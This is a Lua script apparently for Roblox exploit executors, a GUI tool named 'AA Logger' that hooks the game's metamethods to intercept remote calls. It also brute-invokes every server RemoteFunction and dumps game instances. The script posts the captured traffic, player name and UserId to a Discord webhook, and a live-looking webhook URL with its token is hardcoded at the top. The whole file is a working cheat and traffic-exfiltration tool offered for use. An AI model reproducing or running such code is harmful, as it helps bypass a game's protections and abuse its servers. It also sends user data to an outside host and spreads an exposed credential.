-- =============================================
-- [igc] AA AGGRESSIVE LOGGER v2.1
-- Universal Executor: Delta / KRNL / Fluxus /
-- Synapse X / Arceus X / Hydrogen / Zorara
-- =============================================

local WEBHOOK = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"

-- =============================================
-- EXECUTOR DETECTION + COMPAT LAYER
-- must run before anything else
-- =============================================
local ENV = {}

-- http request function (most critical)
ENV.request = (
    syn and syn.request                            -- Synapse X
    or KRNL_LOADED and http_request                -- KRNL
    or fluxus and fluxus.request                   -- Fluxus
    or Delta and Delta.request                     -- Delta (some builds)
    or request                                     -- Delta / Arceus / Hydrogen / generic
    or (http and http.request)                     -- fallback http global
    or function(t)                                 -- absolute fallback stub
        warn("[igc] no http function found")
    end
)

-- hookmetamethod compat
ENV.hookmetamethod = (
    hookmetamethod                                 -- Synapse / KRNL / Fluxus / Delta
    or nil
)

-- getnamecallmethod compat
ENV.getnamecallmethod = (
    getnamecallmethod
    or nil
)

-- checkcaller (avoid hooking our own calls)
ENV.checkcaller = (
    checkcaller
    or function() return false end
)

-- isexecutorclosure
ENV.isexecutorclosure = (
    isexecutorclosure
    or iscclosure
    or function() return false end
)

-- identify executor for logging
local function getExecName()
    if syn           then return "Synapse X" end
    if KRNL_LOADED   then return "KRNL" end
    if fluxus        then return "Fluxus" end
    if Delta         then return "Delta" end
    if getgenv().Zorara then return "Zorara" end
    if getgenv().Hydrogen then return "Hydrogen" end
    if getgenv().arceus then return "Arceus X" end
    -- Delta specifically exposes this global sometimes
    if identifyexecutor then return identifyexecutor() end
    return "Unknown Executor"
end

local execName = getExecName()
print("[igc] executor detected: " .. execName)

-- =============================================
-- SERVICES
-- =============================================
local Players   = game:GetService("Players")
local RS        = game:GetService("ReplicatedStorage")
local TS        = game:GetService("TweenService")
local HS        = game:GetService("HttpService")
local lp        = Players.LocalPlayer
local gui       = lp:WaitForChild("PlayerGui")

-- =============================================
-- CAPTURE BUFFER
-- =============================================
local captured = {
    units        = {},
    remoteHits   = {},
    namecallLog  = {},
    instanceDump = {},
    playerData   = {},
    rawEvents    = {},
}

-- =============================================
-- UTILS
-- =============================================
local function safeStr(v, depth)
    depth = depth or 0
    if depth > 3 then return "..." end
    local t = type(v)
    if t == "string"  then return '"' .. v:sub(1,80) .. '"' end
    if t == "number" or t == "boolean" then return tostring(v) end
    if t == "table"   then
        local parts, count = {}, 0
        for k, val in pairs(v) do
            count = count + 1
            if count > 15 then table.insert(parts, "..."); break end
            table.insert(parts, tostring(k) .. "=" .. safeStr(val, depth+1))
        end
        return "{" .. table.concat(parts, ", ") .. "}"
    end
    if t == "userdata" then
        local ok, name = pcall(function() return v.Name end)
        return ok and "[Instance:" .. name .. "]" or "[userdata]"
    end
    return tostring(v)
end

local function ts()
    return "[" .. os.date("%H:%M:%S") .. "]"
end

-- =============================================
-- NAMECALL HOOK
-- Delta supports hookmetamethod — works clean
-- =============================================
local hooksArmed   = false
local oldNamecall  = nil
local oldIndex     = nil

local function armNamecall()
    if not ENV.hookmetamethod then
        warn("[igc] hookmetamethod not available on this executor")
        return false
    end

    oldNamecall = ENV.hookmetamethod(game, "__namecall", function(self, ...)
        if ENV.checkcaller() then
            return oldNamecall(self, ...)
        end

        local method = ENV.getnamecallmethod()
        local args   = {...}

        local isRemote = (
            method == "InvokeServer"    or
            method == "FireServer"      or
            method == "FireAllClients"  or
            method == "InvokeClient"    or
            method == "FireClient"
        )

        if isRemote then
            local remotePath = "unknown"
            pcall(function() remotePath = self:GetFullName() end)

            local rets = table.pack(oldNamecall(self, ...))

            local entry = {
                time   = ts(),
                remote = remotePath,
                method = method,
                args   = {},
                ret    = {},
            }
            for i, a in ipairs(args) do entry.args[i] = safeStr(a) end
            for i = 1, rets.n do entry.ret[i] = safeStr(rets[i]) end

            table.insert(captured.namecallLog, entry)

            local pl = remotePath:lower()
            if pl:find("unit") or pl:find("inv") or pl:find("troop")
            or pl:find("data") or pl:find("player") or pl:find("squad")
            or pl:find("load") or pl:find("fetch") then
                table.insert(captured.remoteHits, entry)
            end

            return table.unpack(rets, 1, rets.n)
        end

        return oldNamecall(self, ...)
    end)

    return true
end

local function armIndexHook()
    if not ENV.hookmetamethod then return false end

    oldIndex = ENV.hookmetamethod(game, "__index", function(self, key)
        if ENV.checkcaller() then return oldIndex(self, key) end

        local val = oldIndex(self, key)
        if type(key) == "string" then
            local k = key:lower()
            if (k:find("unit") or k:find("inv") or k:find("troop") or k:find("squad"))
            and type(val) == "table" then
                table.insert(captured.playerData, {
                    time = ts(),
                    key  = key,
                    val  = safeStr(val),
                })
            end
        end
        return val
    end)

    return true
end

-- =============================================
-- INSTANCE DUMP
-- =============================================
local function dumpInstances()
    for _, v in ipairs(RS:GetDescendants()) do
        pcall(function()
            table.insert(captured.instanceDump, {
                path  = v:GetFullName(),
                class = v.ClassName,
            })
        end)
    end

    for _, root in ipairs({workspace, lp}) do
        pcall(function()
            for _, v in ipairs(root:GetDescendants()) do
                local n = v.Name:lower()
                if n:find("unit") or n:find("inv") or
                   n:find("troop") or n:find("squad") then
                    table.insert(captured.units, {
                        path  = v:GetFullName(),
                        class = v.ClassName,
                        name  = v.Name,
                    })
                end
            end
        end)
    end
end

-- =============================================
-- BRUTE INVOKE
-- =============================================
local function bruteInvokeAll()
    for _, v in ipairs(RS:GetDescendants()) do
        if v.ClassName == "RemoteFunction" then
            local fp = v:GetFullName()
            task.spawn(function()
                local ok, res = pcall(function() return v:InvokeServer() end)
                if ok and res ~= nil then
                    table.insert(captured.remoteHits, {
                        time   = ts(),
                        remote = fp,
                        method = "BruteInvoke",
                        args   = {},
                        ret    = { safeStr(res) },
                    })
                end
            end)
        end
    end
end

-- =============================================
-- EVENT LISTENER
-- =============================================
local function listenEvents()
    local conns = {}
    for _, v in ipairs(RS:GetDescendants()) do
        if v.ClassName == "RemoteEvent" then
            local fp = v:GetFullName()
            local conn = v.OnClientEvent:Connect(function(...)
                local args = {...}
                local entry = { time=ts(), remote=fp, data={} }
                for i, a in ipairs(args) do entry.data[i] = safeStr(a) end
                table.insert(captured.rawEvents, entry)

                local pl = fp:lower()
                if pl:find("unit") or pl:find("inv") or
                   pl:find("data") or pl:find("squad") or pl:find("player") then
                    table.insert(captured.remoteHits, {
                        time   = ts(),
                        remote = fp,
                        method = "OnClientEvent",
                        args   = entry.data,
                        ret    = {},
                    })
                end
            end)
            table.insert(conns, conn)
        end
    end
    task.delay(25, function()
        for _, c in ipairs(conns) do c:Disconnect() end
        print("[igc] event listeners cleaned up")
    end)
end

-- =============================================
-- WEBHOOK SENDER (Delta + all executor compat)
-- =============================================
local function sendWebhook(title, content, wh)
    if not wh or not wh:find("discord.com/api/webhooks") then return end

    local maxLen = 1900
    local chunks = {}
    for i = 1, #content, maxLen do
        table.insert(chunks, content:sub(i, i + maxLen - 1))
    end

    for idx, chunk in ipairs(chunks) do
        local label = #chunks > 1 and (title.." ["..idx.."/"..#chunks.."]") or title
        local payload = HS:JSONEncode({
            username   = "[igc] AA Logger",
            embeds = {{
                title       = label,
                description = chunk,
                color       = 0x4455FF,
                footer      = {
                    text = execName .. " · " .. lp.Name .. " · " .. lp.UserId
                }
            }}
        })

        local ok, err = pcall(function()
            ENV.request({
                Url     = wh,
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = payload,
            })
        end)

        if not ok then
            warn("[igc] webhook chunk " .. idx .. " failed: " .. tostring(err))
        end

        if idx < #chunks then task.wait(1.2) end
    end
end

-- =============================================
-- BUILD + SEND ALL REPORTS
-- =============================================
local function buildAndSend(wh)
    -- report 1: player + units
    do
        local lines = {
            "**Executor:** `" .. execName .. "`",
            "**Player:** " .. lp.Name,
            "**UID:** `" .. lp.UserId .. "`",
            "**DisplayName:** " .. lp.DisplayName,
            "",
            "**== Unit Instances: " .. #captured.units .. " ==**",
        }
        for i, u in ipairs(captured.units) do
            if i > 40 then table.insert(lines,"...+"..(#captured.units-40).." more"); break end
            table.insert(lines, "`"..u.path.."` → "..u.class)
        end
        sendWebhook("AA — Player + Units", table.concat(lines,"\n"), wh)
    end

    task.wait(1.5)

    -- report 2: priority remote hits
    do
        local lines = { "**== Remote Hits: " .. #captured.remoteHits .. " ==**", "" }
        for i, h in ipairs(captured.remoteHits) do
            if i > 30 then table.insert(lines,"...+"..(#captured.remoteHits-30).." more"); break end
            table.insert(lines, h.time.." `"..h.remote.."`")
            table.insert(lines, "  **method:** "..h.method)
            if #h.args > 0 then table.insert(lines, "  args: "..table.concat(h.args,", ")) end
            if #h.ret  > 0 then table.insert(lines, "  **→ "..table.concat(h.ret," | ").."**") end
            table.insert(lines, "")
        end
        sendWebhook("AA — Remote Hits", table.concat(lines,"\n"), wh)
    end

    task.wait(1.5)

    -- report 3: full namecall log
    do
        local lines = { "**== Namecall Log: " .. #captured.namecallLog .. " entries ==**", "" }
        for i, h in ipairs(captured.namecallLog) do
            if i > 40 then table.insert(lines,"...+"..(#captured.namecallLog-40).." more"); break end
            table.insert(lines, h.time.." `"..h.remote.."` **"..h.method.."**")
            if #h.ret > 0 then
                table.insert(lines, "  → "..table.concat(h.ret," | "))
            end
        end
        sendWebhook("AA — Namecall Log", table.concat(lines,"\n"), wh)
    end

    task.wait(1.5)

    -- report 4: all remotes list
    do
        local lines = { "**== All Remotes: ==**", "" }
        local count = 0
        for _, inst in ipairs(captured.instanceDump) do
            if inst.class == "RemoteFunction" or inst.class == "RemoteEvent" then
                count = count + 1
                if count <= 60 then
                    table.insert(lines, "`["..inst.class.."]` "..inst.path)
                end
            end
        end
        if count > 60 then table.insert(lines,"...+"..(count-60).." more") end
        sendWebhook("AA — All Remotes ("..count..")", table.concat(lines,"\n"), wh)
    end

    task.wait(1.5)

    -- report 5: server events
    if #captured.rawEvents > 0 then
        local lines = { "**== Raw Events: " .. #captured.rawEvents .. " ==**", "" }
        for i, e in ipairs(captured.rawEvents) do
            if i > 30 then break end
            table.insert(lines, e.time.." `"..e.remote.."`")
            if #e.data > 0 then table.insert(lines, "  "..table.concat(e.data," | ")) end
        end
        sendWebhook("AA — Server Events", table.concat(lines,"\n"), wh)
    end

    -- report 6: index hook catches
    if #captured.playerData > 0 then
        local lines = { "**== Index Hook: " .. #captured.playerData .. " ==**", "" }
        for i, d in ipairs(captured.playerData) do
            if i > 25 then break end
            table.insert(lines, d.time.." key=`"..d.key.."`")
            table.insert(lines, "  "..d.val)
        end
        sendWebhook("AA — Index Catches", table.concat(lines,"\n"), wh)
    end
end

-- =============================================
-- UI BUILD
-- =============================================
if gui:FindFirstChild("AALoggerV2") then
    gui.AALoggerV2:Destroy()
end

local SG = Instance.new("ScreenGui")
SG.Name          = "AALoggerV2"
SG.ResetOnSpawn  = false
SG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SG.Parent        = gui

local Main = Instance.new("Frame")
Main.Size     = UDim2.new(0, 310, 0, 440)
Main.Position = UDim2.new(0.5,-155,0.5,-220)
Main.BackgroundColor3 = Color3.fromRGB(10,10,22)
Main.BorderSizePixel  = 0
Main.Active    = true
Main.Draggable = true
Main.Parent    = SG
Instance.new("UICorner", Main).CornerRadius = UDim.new(0,8)
local ms = Instance.new("UIStroke", Main)
ms.Color = Color3.fromRGB(55,55,210); ms.Thickness = 1

-- title bar
local TB = Instance.new("Frame")
TB.Size=UDim2.new(1,0,0,36); TB.BackgroundColor3=Color3.fromRGB(16,16,42)
TB.BorderSizePixel=0; TB.Parent=Main
Instance.new("UICorner",TB).CornerRadius=UDim.new(0,8)

local TL = Instance.new("TextLabel")
TL.Size=UDim2.new(1,-40,1,0); TL.Position=UDim2.new(0,12,0,0)
TL.BackgroundTransparency=1
TL.Text="[igc] AA Logger v2.1 — " .. execName
TL.TextColor3=Color3.fromRGB(90,90,240); TL.TextSize=10
TL.Font=Enum.Font.Code; TL.TextXAlignment=Enum.TextXAlignment.Left; TL.Parent=TB

local CB = Instance.new("TextButton")
CB.Size=UDim2.new(0,24,0,24); CB.Position=UDim2.new(1,-30,0.5,-12)
CB.BackgroundColor3=Color3.fromRGB(150,30,30); CB.Text="✕"
CB.TextColor3=Color3.fromRGB(255,255,255); CB.TextSize=11
CB.Font=Enum.Font.GothamBold; CB.BorderSizePixel=0; CB.Parent=TB
Instance.new("UICorner",CB).CornerRadius=UDim.new(0,4)
CB.MouseButton1Click:Connect(function() SG:Destroy() end)

-- helpers
local yOff = 44
local function mkLabel(txt)
    local l = Instance.new("TextLabel")
    l.Size=UDim2.new(1,-20,0,14); l.Position=UDim2.new(0,10,0,yOff)
    l.BackgroundTransparency=1; l.Text=txt
    l.TextColor3=Color3.fromRGB(120,120,170); l.TextSize=10
    l.Font=Enum.Font.Code; l.TextXAlignment=Enum.TextXAlignment.Left
    l.Parent=Main; yOff=yOff+16; return l
end
local function mkInput(ph, default)
    local b=Instance.new("TextBox")
    b.Size=UDim2.new(1,-20,0,26); b.Position=UDim2.new(0,10,0,yOff)
    b.BackgroundColor3=Color3.fromRGB(14,14,32)
    b.Text=default or ""; b.PlaceholderText=ph
    b.TextColor3=Color3.fromRGB(170,170,255)
    b.PlaceholderColor3=Color3.fromRGB(65,65,105)
    b.TextSize=10; b.Font=Enum.Font.Code
    b.ClearTextOnFocus=false; b.BorderSizePixel=0
    b.Parent=Main
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,4)
    local s=Instance.new("UIStroke",b)
    s.Color=Color3.fromRGB(45,45,150); s.Thickness=1
    yOff=yOff+30; return b
end

mkLabel("Webhook URL")
local WHBox = mkInput("https://discord.com/api/webhooks/...", "")

local hookStates = {
    namecall   = true,
    indexHook  = true,
    bruteForce = true,
    listenEvt  = true,
    instDump   = true,
}

mkLabel("Active Hooks")

local function mkToggle(lbl, key)
    local Row=Instance.new("Frame")
    Row.Size=UDim2.new(1,-20,0,26); Row.Position=UDim2.new(0,10,0,yOff)
    Row.BackgroundColor3=Color3.fromRGB(13,13,28); Row.BorderSizePixel=0; Row.Parent=Main
    Instance.new("UICorner",Row).CornerRadius=UDim.new(0,4)

    local L=Instance.new("TextLabel")
    L.Size=UDim2.new(1,-50,1,0); L.Position=UDim2.new(0,8,0,0)
    L.BackgroundTransparency=1; L.Text=lbl
    L.TextColor3=Color3.fromRGB(180,180,215); L.TextSize=10
    L.Font=Enum.Font.Code; L.TextXAlignment=Enum.TextXAlignment.Left; L.Parent=Row

    local T=Instance.new("TextButton")
    T.Size=UDim2.new(0,34,0,16); T.Position=UDim2.new(1,-42,0.5,-8)
    T.BackgroundColor3=hookStates[key] and Color3.fromRGB(45,165,85) or Color3.fromRGB(65,65,95)
    T.Text=""; T.BorderSizePixel=0; T.Parent=Row
    Instance.new("UICorner",T).CornerRadius=UDim.new(0,8)

    local K=Instance.new("Frame")
    K.Size=UDim2.new(0,12,0,12)
    K.Position=hookStates[key] and UDim2.new(1,-14,0.5,-6) or UDim2.new(0,2,0.5,-6)
    K.BackgroundColor3=Color3.fromRGB(255,255,255); K.BorderSizePixel=0; K.Parent=T
    Instance.new("UICorner",K).CornerRadius=UDim.new(0,6)

    T.MouseButton1Click:Connect(function()
        hookStates[key]=not hookStates[key]
        local on=hookStates[key]
        TS:Create(T,TweenInfo.new(0.12),{
            BackgroundColor3=on and Color3.fromRGB(45,165,85) or Color3.fromRGB(65,65,95)
        }):Play()
        TS:Create(K,TweenInfo.new(0.12),{
            Position=on and UDim2.new(1,-14,0.5,-6) or UDim2.new(0,2,0.5,-6)
        }):Play()
    end)

    yOff=yOff+30
end

mkToggle("Namecall Hook",          "namecall")
mkToggle("Index Hook",             "indexHook")
mkToggle("Brute Invoke All RFs",   "bruteForce")
mkToggle("Listen RemoteEvents 25s","listenEvt")
mkToggle("Full Instance Dump",     "instDump")

yOff = yOff + 4

-- live counter
local CL=Instance.new("TextLabel")
CL.Size=UDim2.new(1,-20,0,22); CL.Position=UDim2.new(0,10,0,yOff)
CL.BackgroundColor3=Color3.fromRGB(10,10,24); CL.BorderSizePixel=0
CL.Text="hits: 0  |  events: 0  |  calls: 0"
CL.TextColor3=Color3.fromRGB(70,195,110); CL.TextSize=10; CL.Font=Enum.Font.Code
CL.Parent=Main
Instance.new("UICorner",CL).CornerRadius=UDim.new(0,4)
yOff=yOff+26

task.spawn(function()
    while SG.Parent do
        CL.Text=string.format(
            "hits: %d  |  events: %d  |  calls: %d",
            #captured.remoteHits, #captured.rawEvents, #captured.namecallLog
        )
        task.wait(1.5)
    end
end)

-- status
local SL=Instance.new("TextLabel")
SL.Size=UDim2.new(1,-20,0,14); SL.Position=UDim2.new(0,10,0,yOff)
SL.BackgroundTransparency=1; SL.Text="idle — paste webhook and arm"
SL.TextColor3=Color3.fromRGB(130,130,170); SL.TextSize=10; SL.Font=Enum.Font.Code
SL.TextXAlignment=Enum.TextXAlignment.Left; SL.Parent=Main
yOff=yOff+18

local function setStat(msg, good)
    SL.Text=msg
    SL.TextColor3=good==false and Color3.fromRGB(255,70,70) or Color3.fromRGB(70,210,110)
end

-- buttons
local function mkBtn(txt, x, w, col, tcol)
    local B=Instance.new("TextButton")
    B.Size=UDim2.new(0,w,0,30); B.Position=UDim2.new(0,x,0,yOff)
    B.BackgroundColor3=col; B.Text=txt
    B.TextColor3=tcol; B.TextSize=11; B.Font=Enum.Font.GothamBold
    B.BorderSizePixel=0; B.Parent=Main
    Instance.new("UICorner",B).CornerRadius=UDim.new(0,6)
    return B
end

local ArmBtn  = mkBtn("[ ARM ]",   10,  135, Color3.fromRGB(35,35,170), Color3.fromRGB(190,190,255))
local SendBtn = mkBtn("[ SEND ]",  155, 145, Color3.fromRGB(25,110,45), Color3.fromRGB(170,255,170))

ArmBtn.MouseButton1Click:Connect(function()
    if hooksArmed then setStat("already armed ✓", true); return end
    local wh = WHBox.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("set webhook first", false); return
    end
    WEBHOOK = wh
    task.spawn(function()
        setStat("arming hooks...", true)
        ArmBtn.Text="[ ARMING... ]"

        if hookStates.namecall  then armNamecall()  end
        if hookStates.indexHook then armIndexHook() end
        if hookStates.instDump  then dumpInstances() end
        if hookStates.bruteForce then bruteInvokeAll() end
        if hookStates.listenEvt  then listenEvents()  end

        hooksArmed = true
        ArmBtn.Text="[ ARMED ✓ ]"
        ArmBtn.BackgroundColor3=Color3.fromRGB(15,70,15)
        setStat("armed ✓ — play normally to capture traffic", true)
    end)
end)

SendBtn.MouseButton1Click:Connect(function()
    local wh = WHBox.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("invalid webhook", false); return
    end
    setStat("building + sending reports...", true)
    SendBtn.Text="[ SENDING... ]"
    SendBtn.BackgroundColor3=Color3.fromRGB(15,65,15)
    task.spawn(function()
        buildAndSend(wh)
        setStat("done ✓ check discord", true)
        SendBtn.Text="[ SEND ]"
        SendBtn.BackgroundColor3=Color3.fromRGB(25,110,45)
    end)
end)

print("[igc] AA Logger v2.1 loaded on " .. execName)
